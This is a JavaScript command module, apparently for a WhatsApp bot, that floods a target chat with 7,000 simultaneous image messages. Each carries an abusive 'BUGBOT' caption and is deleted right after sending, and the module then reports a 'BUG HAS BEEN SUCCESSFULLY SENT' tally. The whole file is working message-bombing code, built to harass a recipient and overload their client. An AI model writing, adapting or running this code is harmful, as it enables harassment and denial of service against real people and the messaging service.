const { channelInfo } = require('../lib/messageConfig');

async function sulexhCommand(sock, chatId, message) {

try {

const total = 7000;
const tasks = [];

console.log("🚀 Launching instant BOOM...");

const start = Date.now();

/* Create all send tasks instantly */

for (let i = 0; i < total; i++) {

tasks.push(

sock.sendMessage(chatId, {
image: { url: "https://files.catbox.moe/ip70j9.jpg" },
caption: "💥☠️😭😭YOU HAVE BEEN SUCCESSFULLY FUCKED🖕🖕 BY BUGBOT🤖🤖☠️☠️ 💥"
}).then(async (msg) => {

/* auto delete after sending */

await sock.sendMessage(chatId, {
delete: msg.key
});

return true;

}).catch(() => false)

);

}

/* Execute all simultaneously */

const results = await Promise.all(tasks);

const end = Date.now();

const success = results.filter(r => r === true).length;
const failed = total - success;

/* Only confirmation remains in chat */

await sock.sendMessage(chatId, {

text:
`✅ BUG HAS BEEN SUCCESSFULLY SENT\n\n` +
`📨 Sent: ${success}/${total}\n` +
`❌ Failed: ${failed}\n` +
`⚡ Mode: Instant Parallel\n` +
`⏱️ Time: ${end - start} ms`,

...channelInfo

}, { quoted: message });

} catch (err) {

console.error(err);

await sock.sendMessage(chatId, {
text: "❌ BOOM SYSTEM ERROR",
...channelInfo
}, { quoted: message });

}

}

module.exports = sulexhCommand;
